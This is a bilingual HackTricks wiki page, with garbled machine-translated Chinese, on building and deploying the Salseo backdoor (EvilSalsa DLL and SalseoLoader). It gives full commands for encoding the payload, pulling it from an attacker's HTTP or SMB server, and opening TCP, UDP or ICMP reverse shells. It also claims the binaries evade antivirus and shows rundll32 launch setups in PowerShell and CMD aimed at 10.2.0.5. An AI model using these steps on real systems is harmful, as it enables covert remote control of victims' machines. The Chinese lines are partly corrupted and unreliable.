# Salseo

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

<summary> <strong>支持hacktricks并获得好处！</strong> </summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

 - 您在**网络安全公司**工作吗？ 您是否想看到您的**公司在hacktricks **中刊登广告？ 还是您想访问**最新版本的豌豆或在pdf **中下载hacktricks？ 检查[**订阅计划**]（https://github.com/sponsors/carlospolop）！

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

 - 发现[**豌豆家庭**]（https://opensea.io/collection/the-peass-family），我们的独家[** nfts **]（https://opensea.io/collection） /家庭家庭）

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

 - 获取[**官方豌豆和hacktricks赃物**]（https://peass.creator-spring.com）

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

 -  **加入** [**💬**]（https://emojipedia.org/speech-balloon/）[** discord group **]（https://discord.gg/hrep4ruj7f）或[ **电报组**]（https://t.me/peass）或**在** Twitter ** [**🐦**]（https://github.com/carloppolop/hacktrickss on ** twitter **） /ree/7af18b62b3bdc423e114444444677a6a73d4043511e9/ \ [https:/emojipedia.org/bird/bird/readme.md）eardme.md）eghterme.md）eghterme.md）eghterme.md）eghtemplopmbyth

- **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

 -  **通过将PRS提交给** [** hacktricks github repo **]（https://github.com/carloppolop/hacktricks）**。

</details>

## Compiling the binaries

##编译二进制文件

Download the source code from the github and compile **EvilSalsa** and **SalseoLoader**. You will need **Visual Studio** installed to compile the code.

从github下载源代码，并编译** evilsalsa **和** salseoloader **。 您将需要** Visual Studio **安装来编译代码。

Compile those projects for the architecture of the windows box where your are going to use them(If the Windows supports x64 compile them for that architectures).

为您将要使用它们的Windows框的架构编译这些项目（如果Windows支持X64为其为该架构编译）。

You can **select the architecture** inside Visual Studio in the **left "Build" Tab** in **"Platform Target".**

您可以**选择架构**在**左“构建” tab ** in **“平台目标”中的Visual Studio内部。**

(\*\*If you can't find this options press in **"Project Tab"** and then in **"\<Project Name> Properties"**)

（\*\*如果找不到此选项，请按**“ Project Tab” **，然后在**“ \ <Project Name> properties” ** **）

![](<../.gitbook/assets/image (132).png>)

Then, build both projects (Build -> Build Solution) (Inside the logs will appear the path of the executable):

然后，构建两个项目（构建 - >构建解决方案）（在日志内将显示可执行文件的路径）：

![](<../.gitbook/assets/image (1) (2) (1) (1).png>)

## Prepare the Backdoor

##准备后门

First of all, you will need to encode the **EvilSalsa.dll.** To do so, you can use the python script **encrypterassembly.py** or you can compile the project **EncrypterAssembly**:

首先，您需要编码** evilsalsa.dll。

### **Python**

```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```

### Windows

```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```

Ok, now you have everything you need to execute all the Salseo thing: the **encoded EvilDalsa.dll** and the **binary of SalseoLoader.**

好的，现在您拥有执行所有Salseo的一切所需的一切：**编码的evildalsa.dll **和salseoloader的**二进制文件。**

**Upload the SalseoLoader.exe binary to the machine. They shouldn't be detected by any AV...**

**将salseoloader.exe二进制上传到机器。 任何AV都不应该检测到它们... **

## **Execute the backdoor**

## **执行后门**

### **Getting a TCP reverse shell (downloading encoded dll through HTTP)**

### **获取TCP反向外壳（通过HTTP下载编码的DLL）**

Remember to start a nc as the reverse shell listener and a HTTP server to serve the encoded evilsalsa.

请记住，将NC作为反向外壳侦听器和HTTP服务器启动，以服务编码的Evilsalsa。

```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```

### **Getting a UDP reverse shell (downloading encoded dll through SMB)**

### **获取UDP反向外壳（通过SMB下载编码的DLL）**

Remember to start a nc as the reverse shell listener, and a SMB server to serve the encoded evilsalsa (impacket-smbserver).

请记住，启动NC作为反向外壳侦听器和SMB服务器，以服务编码的Evilsalsa（Impacket-Smbserver）。

```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```

### **Getting a ICMP reverse shell (encoded dll already inside the victim)**

### **获取ICMP反向外壳（受害者内部已经编码的DLL）**

**This time you need a special tool in the client to receive the reverse shell. Download:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

**这次您需要客户中的特殊工具来接收反向外壳。 下载：** [** https：//github.com/inquarb/icmpshxhyde]

#### **Disable ICMP Replies:**

```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```

#### Execute the client:

####执行客户端：

```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```

#### Inside the victim, lets execute the salseo thing:

####在受害者内部，让我们执行Salseo的事情：

```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```

## Compiling SalseoLoader as DLL exporting main function

##将salseoloader作为DLL导出主要功能

Open the SalseoLoader project using Visual Studio.

使用Visual Studio打开Salseoloader项目。

### Add before the main function: \[DllExport]

###在主函数之前添加：\ [dllexport]

![](<../.gitbook/assets/image (2) (1) (1).png>)

### Install DllExport for this project

###为该项目安装dllexport

#### **Tools** --> **NuGet Package Manager** --> **Manage NuGet Packages for Solution...**

#### **工具**  - > ** Nuget软件包管理器**  - > **管理Nuget软件包用于解决方案... **

![](<../.gitbook/assets/image (3) (1) (1) (1).png>)

#### **Search for DllExport package (using Browse tab), and press Install (and accept the popup)**

#### **搜索dllexport软件包（使用浏览选项卡），然后按安装（并接受弹出窗口）**

![](<../.gitbook/assets/image (4) (1) (1).png>)

In your project folder have appeared the files: **DllExport.bat** and **DllExport\_Configure.bat**

在您的项目文件夹中显示了文件：** dllexport.bat **和** dllexport \ _configure.bat **

### **U**ninstall DllExport

Press **Uninstall** (yeah, its weird but trust me, it is necessary)

按**卸载**（是的，这很奇怪，但请相信我，这是必要的）

![](<../.gitbook/assets/image (5) (1).png>)

### **Exit Visual Studio and execute DllExport\_configure**

Just **exit** Visual Studio

只是**退出**视觉工作室

Then, go to your **SalseoLoader folder** and **execute DllExport\_Configure.bat**

然后，转到您的** salseoloader文件夹**和**执行dllexport \ _configure.bat **

Select **x64** (if you are going to use it inside a x64 box, that was my case), select **System.Runtime.InteropServices** (inside **Namespace for DllExport**) and press **Apply**

选择** x64 **（如果您要在X64框中使用它，那就是我的情况），选择** system.runtime.interopservices **（内部** dllexport **命名空间**），然后按**应用**应用** **

![](<../.gitbook/assets/image (7) (1) (1).png>)

### **Open the project again with visual Studio**

### **再次使用Visual Studio **打开项目

**\[DllExport]** should not be longer marked as error

** \ [dllexport] **不应更长的标记为错误

![](<../.gitbook/assets/image (8) (1).png>)

### Build the solution

###构建解决方案

Select **Output Type = Class Library** (Project --> SalseoLoader Properties --> Application --> Output type = Class Library)

选择**输出类型=类库**（project-> salseoloader属性 - >应用程序 - >输出类型=类库）

![](<../.gitbook/assets/image (10).png>)

Select **x64** **platform** (Project --> SalseoLoader Properties --> Build --> Platform target = x64)

选择** x64 ** **平台**（项目 - > salseoloader属性 - > build-> platform target = x64）

![](<../.gitbook/assets/image (9) (1) (1).png>)

To **build** the solution: Build --> Build Solution (Inside the Output console the path of the new DLL will appear)

**构建**解决方案：构建 - >构建解决方案（在输出控制台内部将出现新DLL的路径）

### Test the generated Dll

###测试生成的DLL

Copy and paste the Dll where you want to test it.

复制并粘贴DLL您要测试的DLL。

Execute:

```
rundll32.exe SalseoLoader.dll,main
```

If no error appears, probably you have a functional DLL!!

如果没有出现错误，可能您有功能性DLL！

## Get a shell using the DLL

##使用DLL获取外壳

Don't forget to use a **HTTP** **server** and set a **nc** **listener**

不要忘记使用** http ** **服务器**并设置** nc ** **侦听器**
### Powershell

＃＃＃ 电源外壳

```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```

### CMD

### CMD

```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

<summary> <strong>支持hacktricks并获得好处！</strong> </summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

 - 您在**网络安全公司**工作吗？ 您是否想看到您的**公司在hacktricks **中刊登广告？ 还是您想访问**最新版本的豌豆或在pdf **中下载hacktricks？ 检查[**订阅计划**]（https://github.com/sponsors/carlospolop）！

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

 - 发现[**豌豆家庭**]（https://opensea.io/collection/the-peass-family），我们的独家[** nfts **]（https://opensea.io/collection） /家庭家庭）

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

 - 获取[**官方豌豆和hacktricks赃物**]（https://peass.creator-spring.com）

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

 -  **加入** [**💬**]（https://emojipedia.org/speech-balloon/）[** discord group **]（https://discord.gg/hrep4ruj7f）或[ **电报组**]（https://t.me/peass）或**在** Twitter ** [**🐦**]（https://github.com/carloppolop/hacktrickss on ** twitter **） /ree/7af18b62b3bdc423e114444444677a6a73d4043511e9/ \ [https:/emojipedia.org/bird/bird/readme.md）eardme.md）eghterme.md）eghterme.md）eghterme.md）eghtemplopmbyth

- **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

 -  **通过将PRS提交给** [** hacktricks github repo **]（https://github.com/carloppolop/hacktricks）**。

</details>
